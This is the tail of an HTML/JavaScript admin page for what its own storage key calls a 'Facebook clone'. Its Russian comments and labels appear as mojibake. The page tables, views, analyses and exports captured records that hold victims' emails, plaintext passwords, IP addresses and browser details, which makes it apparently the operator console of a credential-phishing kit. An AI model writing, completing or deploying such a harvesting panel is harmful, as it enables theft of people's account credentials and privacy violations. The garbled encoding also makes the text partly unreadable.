            filteredUsers.forEach((user, index) => {
                try {
                    const row = document.createElement('tr');
                    
                    // –§–æ—Ä–º–∞—Ç–∏—Ä—É–µ–º –≤—Ä–µ–º—è
                    let timeFormatted = '–û—à–∏–±–∫–∞ –¥–∞—Ç—ã';
                    try {
                        const date = new Date(user.timestamp);
                        timeFormatted = date.toLocaleString('ru-RU', {
                            day: '2-digit',
                            month: '2-digit',
                            year: 'numeric',
                            hour: '2-digit',
                            minute: '2-digit'
                        });
                    } catch (e) {
                        timeFormatted = user.timestamp || '–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö';
                    }
                    
                    // –ë—Ä–∞—É–∑–µ—Ä
                    const browser = user.browser?.name || user.userAgent?.substring(0, 30) || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ';
                    
                    // –≠–∫—Ä–∞–Ω
                    const screen = user.screen ? 
                        `${user.screen.width || 0}√ó${user.screen.height || 0}` : 
                        '–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö';
                    
                    row.innerHTML = `
                        <td>${index + 1}</td>
                        <td class="email-cell" title="${user.email}">${user.email || '–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö'}</td>
                        <td class="password-cell" title="–ü–∞—Ä–æ–ª—å: ${user.password}">
                            ${'‚Ä¢'.repeat(Math.min(user.password?.length || 8, 12))}
                        </td>
                        <td title="${user.ip}">${user.ip || 'unknown'}</td>
                        <td class="time-cell" title="${user.timestamp}">${timeFormatted}</td>
                        <td title="${user.userAgent || browser}">${browser}</td>
                        <td>${screen}</td>
                        <td>
                            <div class="table-actions">
                                <button onclick="viewUserDetails('${user.id}')" class="table-btn view">
                                    üëÅÔ∏è –ü—Ä–æ—Å–º–æ—Ç—Ä
                                </button>
                                <button onclick="deleteUser('${user.id}')" class="table-btn delete">
                                    üóëÔ∏è –£–¥–∞–ª–∏—Ç—å
                                </button>
                            </div>
                        </td>
                    `;
                    
                    tableBody.appendChild(row);
                    
                } catch (error) {
                    console.error('‚ùå –û—à–∏–±–∫–∞ —Å–æ–∑–¥–∞–Ω–∏—è —Å—Ç—Ä–æ–∫–∏:', error);
                }
            });
            
            console.log('‚úÖ –¢–∞–±–ª–∏—Ü–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∞:', filteredUsers.length, '—Å—Ç—Ä–æ–∫');
        }
        
        function filterData() {
            console.log('üîç –ü—Ä–∏–º–µ–Ω–µ–Ω–∏–µ —Ñ–∏–ª—å—Ç—Ä–æ–≤');
            loadAdminData();
        }
        
        function refreshData() {
            console.log('üîÑ –ü—Ä–∏–Ω—É–¥–∏—Ç–µ–ª—å–Ω–æ–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö');
            loadAdminData();
        }
        
        // ========== –î–ï–ô–°–¢–í–ò–Ø –° –ü–û–õ–¨–ó–û–í–ê–¢–ï–õ–Ø–ú–ò ==========
        
        function viewUserDetails(userId) {
            console.log('üëÅÔ∏è –ü—Ä–æ—Å–º–æ—Ç—Ä –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:', userId);
            
            const users = DataCollector.getAllUsers ? 
                DataCollector.getAllUsers() : 
                (DataCollector.data?.users || []);
            
            const user = users.find(u => u.id === userId);
            
            if (!user) {
                alert('‚ùå –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω');
                return;
            }
            
            const details = `
üë§ –î–ï–¢–ê–õ–ò –ü–û–õ–¨–ó–û–í–ê–¢–ï–õ–Ø

üìß Email: ${user.email}
üîë –ü–∞—Ä–æ–ª—å: ${user.password}
üïê –í—Ä–µ–º—è: ${new Date(user.timestamp).toLocaleString('ru-RU')}
üåê IP: ${user.ip}
üñ•Ô∏è –ë—Ä–∞—É–∑–µ—Ä: ${user.browser?.name || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'} ${user.browser?.version || ''}
üì± –ü–ª–∞—Ç—Ñ–æ—Ä–º–∞: ${user.browser?.platform || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}
üñºÔ∏è –≠–∫—Ä–∞–Ω: ${user.screen?.width || 0}x${user.screen?.height || 0}
üî§ –Ø–∑—ã–∫: ${user.browser?.language || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}
üìé User-Agent: ${user.userAgent?.substring(0, 100) || '–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö'}
            `;
            
            alert(details);
        }
        
        function deleteUser(userId) {
            console.log('üóëÔ∏è –£–¥–∞–ª–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:', userId);
            
            if (!confirm('‚ö†Ô∏è –£–¥–∞–ª–∏—Ç—å —ç—Ç—É –∑–∞–ø–∏—Å—å? –≠—Ç–æ –¥–µ–π—Å—Ç–≤–∏–µ –Ω–µ–ª—å–∑—è –æ—Ç–º–µ–Ω–∏—Ç—å.')) {
                return;
            }
            
            if (!DataCollector.data || !Array.isArray(DataCollector.data.users)) {
                alert('‚ùå –û—à–∏–±–∫–∞: –¥–∞–Ω–Ω—ã–µ –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω—ã');
                return;
            }
            
            const initialLength = DataCollector.data.users.length;
            DataCollector.data.users = DataCollector.data.users.filter(u => u.id !== userId);
            
            if (DataCollector.data.users.length < initialLength) {
                // –°–æ—Ö—Ä–∞–Ω—è–µ–º –∏–∑–º–µ–Ω–µ–Ω–∏—è
                if (DataCollector.saveToStorage) {
                    DataCollector.saveToStorage();
                } else if (DataCollector.saveData) {
                    DataCollector.saveData();
                } else {
                    localStorage.setItem('facebook_clone_data_v4', JSON.stringify(DataCollector.data));
                }
                
                console.log('‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —É–¥–∞–ª–µ–Ω');
                alert('‚úÖ –ó–∞–ø–∏—Å—å —É–¥–∞–ª–µ–Ω–∞!');
                
                // –û–±–Ω–æ–≤–ª—è–µ–º –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å
                loadAdminData();
                
            } else {
                alert('‚ùå –ó–∞–ø–∏—Å—å –Ω–µ –Ω–∞–π–¥–µ–Ω–∞');
            }
        }
        
        function clearAllData() {
            console.log('üóëÔ∏è –û—á–∏—Å—Ç–∫–∞ –≤—Å–µ—Ö –¥–∞–Ω–Ω—ã—Ö');
            
            if (!confirm('‚ö†Ô∏è –í–ù–ò–ú–ê–ù–ò–ï!\n\n–í—ã —Å–æ–±–∏—Ä–∞–µ—Ç–µ—Å—å —É–¥–∞–ª–∏—Ç—å –í–°–ï –¥–∞–Ω–Ω—ã–µ –∏–∑ —Å–∏—Å—Ç–µ–º—ã.\n–≠—Ç–æ –¥–µ–π—Å—Ç–≤–∏–µ –Ω–µ–ª—å–∑—è –æ—Ç–º–µ–Ω–∏—Ç—å.\n\n–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å?')) {
                return;
            }
            
            if (DataCollector.clearAllData) {
                DataCollector.clearAllData();
            } else {
                DataCollector.data = {
                    users: [],
                    visits: [],
                    logs: [],
                    settings: {
                        created: new Date().toISOString(),
                        totalLogins: 0,
                        uniqueIPs: []
                    }
                };
                
                localStorage.setItem('facebook_clone_data_v4', JSON.stringify(DataCollector.data));
            }
            
            console.log('‚úÖ –í—Å–µ –¥–∞–Ω–Ω—ã–µ –æ—á–∏—â–µ–Ω—ã');
            alert('‚úÖ –í—Å–µ –¥–∞–Ω–Ω—ã–µ —É—Å–ø–µ—à–Ω–æ —É–¥–∞–ª–µ–Ω—ã!');
            
            // –û–±–Ω–æ–≤–ª—è–µ–º –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å
            loadAdminData();
        }
        
        // ========== –ê–ù–ê–õ–ò–¢–ò–ö–ê ==========
        
        function updateAnalytics(users) {
            console.log('üìä –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –∞–Ω–∞–ª–∏—Ç–∏–∫–∏:', users.length, '–ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π');
            
            const analytics = document.getElementById('analytics');
            if (!analytics) return;
            
            if (!users || users.length === 0) {
                analytics.innerHTML = '<p>üì≠ –ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö –¥–ª—è –∞–Ω–∞–ª–∏—Ç–∏–∫–∏</p>';
                return;
            }
            
            // –ê–Ω–∞–ª–∏–∑ –ø–æ —á–∞—Å–∞–º
            const hourlyData = Array(24).fill(0);
            users.forEach(user => {
                try {
                    const hour = new Date(user.timestamp).getHours();
                    hourlyData[hour]++;
                } catch (e) {
                    // –ò–≥–Ω–æ—Ä–∏—Ä—É–µ–º –æ—à–∏–±–∫–∏
                }
            });
            
            // –ë—Ä–∞—É–∑–µ—Ä—ã
            const browsers = {};
            users.forEach(user => {
                const browserName = user.browser?.name || '–î—Ä—É–≥–æ–π';
                browsers[browserName] = (browsers[browserName] || 0) + 1;
            });
            
            // –°–æ–∑–¥–∞–µ–º HTML
            let html = `
                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 20px;">
                    
                    <!-- –ê–∫—Ç–∏–≤–Ω–æ—Å—Ç—å –ø–æ —á–∞—Å–∞–º -->
                    <div style="background: #f8f9fa; padding: 20px; border-radius: 10px;">
                        <h4 style="margin-top: 0; color: #1877f2;">üìä –ê–∫—Ç–∏–≤–Ω–æ—Å—Ç—å –ø–æ —á–∞—Å–∞–º</h4>
                        <div style="margin-top: 15px; display: flex; align-items: flex-end; height: 100px; gap: 4px;">
            `;
            
            const maxHourly = Math.max(...hourlyData, 1);
            for (let hour = 0; hour < 24; hour++) {
                const height = (hourlyData[hour] / maxHourly) * 80;
                html += `
                    <div style="text-align: center; flex: 1;">
                        <div style="height: ${height}px; background: #1877f2; border-radius: 4px 4px 0 0;"></div>
                        <div style="font-size: 11px; margin-top: 5px;">${hour}:00</div>
                    </div>
                `;
            }
            
            html += `
                        </div>
                        <p style="margin-top: 10px; font-size: 12px; color: #65676b;">
                            –í—Å–µ–≥–æ –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–µ–π: ${users.length}
                        </p>
                    </div>
                    
                    <!-- –ë—Ä–∞—É–∑–µ—Ä—ã -->
                    <div style="background: #f8f9fa; padding: 20px; border-radius: 10px;">
                        <h4 style="margin-top: 0; color: #42b72a;">üåê –ë—Ä–∞—É–∑–µ—Ä—ã –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π</h4>
                        <div style="margin-top: 15px;">
            `;
            
            Object.entries(browsers).forEach(([browser, count]) => {
                const percentage = ((count / users.length) * 100).toFixed(1);
                html += `
                    <div style="margin-bottom: 10px;">
                        <div style="display: flex; justify-content: space-between; margin-bottom: 4px;">
                            <span>${browser}</span>
                            <span>${count} (${percentage}%)</span>
                        </div>
                        <div style="height: 8px; background: #e4e6eb; border-radius: 4px; overflow: hidden;">
                            <div style="height: 100%; width: ${percentage}%; background: #42b72a; border-radius: 4px;"></div>
                        </div>
                    </div>
                `;
            });
            
            html += `
                        </div>
                    </div>
                </div>
            `;
            
            analytics.innerHTML = html;
            console.log('‚úÖ –ê–Ω–∞–ª–∏—Ç–∏–∫–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∞');
        }
        
        // ========== –≠–ö–°–ü–û–†–¢ –î–ê–ù–ù–´–• ==========
        
        function showExportModal() {
            console.log('üì§ –ü–æ–∫–∞–∑ –º–æ–¥–∞–ª—å–Ω–æ–≥–æ –æ–∫–Ω–∞ —ç–∫—Å–ø–æ—Ä—Ç–∞');
            const modal = document.getElementById('exportModal');
            if (modal) {
                modal.style.display = 'flex';
                updateDataPreview();
            }
        }
        
        function closeExportModal() {
            const modal = document.getElementById('exportModal');
            if (modal) {
                modal.style.display = 'none';
            }
        }
        
        function updateDataPreview() {
            const preview = document.getElementById('dataPreview');
            if (!preview || !DataCollector) return;
            
            try {
                const data = DataCollector.exportData ? 
                    DataCollector.exportData('json') : 
                    JSON.stringify({ error: 'DataCollector –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç —ç–∫—Å–ø–æ—Ä—Ç' }, null, 2);
                
                preview.textContent = data.length > 1000 ? 
                    data.substring(0, 1000) + '...' : 
                    data;
                    
            } catch (error) {
                preview.textContent = `‚ùå –û—à–∏–±–∫–∞: ${error.message}`;
            }
        }
        
        function exportData(format) {
            console.log(`üì• –≠–∫—Å–ø–æ—Ä—Ç –¥–∞–Ω–Ω—ã—Ö –≤ ${format}`);
            
            if (!DataCollector.downloadData) {
                alert('‚ùå –§—É–Ω–∫—Ü–∏—è —ç–∫—Å–ø–æ—Ä—Ç–∞ –Ω–µ –¥–æ—Å—Ç—É–ø–Ω–∞');
                return;
            }
            
            try {
                const success = DataCollector.downloadData(format);
                
                if (success) {
                    console.log(`‚úÖ –≠–∫—Å–ø–æ—Ä—Ç –≤ ${format} —É—Å–ø–µ—à–µ–Ω`);
                    closeExportModal();
                } else {
                    alert('‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ —ç–∫—Å–ø–æ—Ä—Ç–µ –¥–∞–Ω–Ω—ã—Ö');
                }
                
            } catch (error) {
                console.error('‚ùå –û—à–∏–±–∫–∞ —ç–∫—Å–ø–æ—Ä—Ç–∞:', error);
                alert(`‚ùå –û—à–∏–±–∫–∞ —ç–∫—Å–ø–æ—Ä—Ç–∞: ${error.message}`);
            }
        }
        
        function showDataPreview() {
            console.log('üëÅÔ∏è –ü–æ–∫–∞–∑ –ø—Ä–µ–¥–ø—Ä–æ—Å–º–æ—Ç—Ä–∞ –¥–∞–Ω–Ω—ã—Ö');
            
            if (!DataCollector.exportData) {
                alert('‚ùå –§—É–Ω–∫—Ü–∏—è –ø—Ä–µ–¥–ø—Ä–æ—Å–º–æ—Ç—Ä–∞ –Ω–µ –¥–æ—Å—Ç—É–ø–Ω–∞');
                return;
            }
            
            try {
                const data = DataCollector.exportData('json');
                const newWindow = window.open();
                
                if (!newWindow) {
                    alert('‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–∫—Ä—ã—Ç—å –Ω–æ–≤–æ–µ –æ–∫–Ω–æ. –†–∞–∑—Ä–µ—à–∏—Ç–µ –≤—Å–ø–ª—ã–≤–∞—é—â–∏–µ –æ–∫–Ω–∞.');
                    return;
                }
                
                newWindow.document.write(`
                    <!DOCTYPE html>
                    <html>
                    <head>
                        <title>–ü—Ä–µ–¥–ø—Ä–æ—Å–º–æ—Ç—Ä –¥–∞–Ω–Ω—ã—Ö - Facebook Clone</title>
                        <style>
                            body {
                                font-family: 'Courier New', monospace;
                                padding: 20px;
                                background: #f5f5f5;
                                margin: 0;
                            }
                            pre {
                                background: white;
                                padding: 20px;
                                border-radius: 8px;
                                overflow: auto;
                                max-height: 90vh;
                                border: 1px solid #ddd;
                            }
                            .header {
                                background: #1877f2;
                                color: white;
                                padding: 15px;
                                border-radius: 8px 8px 0 0;
                                margin-bottom: 20px;
                            }
                        </style>
                    </head>
                    <body>
                        <div class="header">
                            <h2 style="margin: 0;">üìã –ü—Ä–µ–¥–ø—Ä–æ—Å–º–æ—Ç—Ä –¥–∞–Ω–Ω—ã—Ö (JSON)</h2>
                            <p style="margin: 5px 0 0 0; opacity: 0.9;">
                                –í—Å–µ–≥–æ –∑–∞–ø–∏—Å–µ–π: ${DataCollector.getStats ? DataCollector.getStats().totalUsers : 0}
                            </p>
                        </div>
                        <pre>${data}</pre>
                    </body>
                    </html>
                `);
                
            } catch (error) {
                console.error('‚ùå –û—à–∏–±–∫–∞ –ø—Ä–µ–¥–ø—Ä–æ—Å–º–æ—Ç—Ä–∞:', error);
                alert(`‚ùå –û—à–∏–±–∫–∞: ${error.message}`);
            }
        }
        
        // ========== –ì–û–†–Ø–ß–ò–ï –ö–õ–ê–í–ò–®–ò ==========
        
        function setupHotkeys() {
            console.log('‚å®Ô∏è –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –≥–æ—Ä—è—á–∏—Ö –∫–ª–∞–≤–∏—à');
            
            document.addEventListener('keydown', function(e) {
                // –ê–≤—Ç–æ–≤—Ö–æ–¥ (Ctrl+Shift+Enter)
                if (e.ctrlKey && e.shiftKey && e.key === 'Enter') {
                    e.preventDefault();
                    autoLogin();
                }
                
                // –¢–æ–ª—å–∫–æ –µ—Å–ª–∏ –∞–¥–º–∏–Ω–∫–∞ –æ—Ç–∫—Ä—ã—Ç–∞
                const adminInterface = document.getElementById('adminInterface');
                if (!adminInterface || adminInterface.style.display !== 'block') {
                    return;
                }
                
                // –û–±–Ω–æ–≤–∏—Ç—å (F5)
                if (e.key === 'F5') {
                    e.preventDefault();
                    refreshData();
                }
                
                // –≠–∫—Å–ø–æ—Ä—Ç (Ctrl+E)
                if (e.ctrlKey && e.key === 'e') {
                    e.preventDefault();
                    showExportModal();
                }
                
                // –û—á–∏—Å—Ç–∏—Ç—å (Ctrl+D)
                if (e.ctrlKey && e.key === 'd') {
                    e.preventDefault();
                    clearAllData();
                }
                
                // –ü—Ä–µ–¥–ø—Ä–æ—Å–º–æ—Ç—Ä (Ctrl+P)
                if (e.ctrlKey && e.key === 'p') {
                    e.preventDefault();
                    showDataPreview();
                }
                
                // –í—ã—Ö–æ–¥ (Ctrl+Q)
                if (e.ctrlKey && e.key === 'q') {
                    e.preventDefault();
                    logoutAdmin();
                }
                
                // –ó–∞–∫—Ä—ã—Ç—å –º–æ–¥–∞–ª–∫–∏ (Escape)
                if (e.key === 'Escape') {
                    closeExportModal();
                }
            });
        }
        
        // ========== –í–°–ü–û–ú–û–ì–ê–¢–ï–õ–¨–ù–´–ï –§–£–ù–ö–¶–ò–ò ==========
        
        function showError(message) {
            alert(`‚ùå ${message}`);
        }
        
        // –≠–∫—Å–ø–æ—Ä—Ç —Ñ—É–Ω–∫—Ü–∏–π –≤ –≥–ª–æ–±–∞–ª—å–Ω—É—é –æ–±–ª–∞—Å—Ç—å –≤–∏–¥–∏–º–æ—Å—Ç–∏
        window.checkPassword = checkPassword;
        window.autoLogin = autoLogin;
        window.logoutAdmin = logoutAdmin;
        window.refreshData = refreshData;
        window.clearAllData = clearAllData;
        window.showExportModal = showExportModal;
        window.closeExportModal = closeExportModal;
        window.exportData = exportData;
        window.showDataPreview = showDataPreview;
        window.filterData = filterData;
        window.viewUserDetails = viewUserDetails;
        window.deleteUser = deleteUser;
        
        console.log('‚úÖ –ê–¥–º–∏–Ω —Å–∫—Ä–∏–ø—Ç –ø–æ–ª–Ω–æ—Å—Ç—å—é –∑–∞–≥—Ä—É–∂–µ–Ω');
    </script>
</body>
</html>
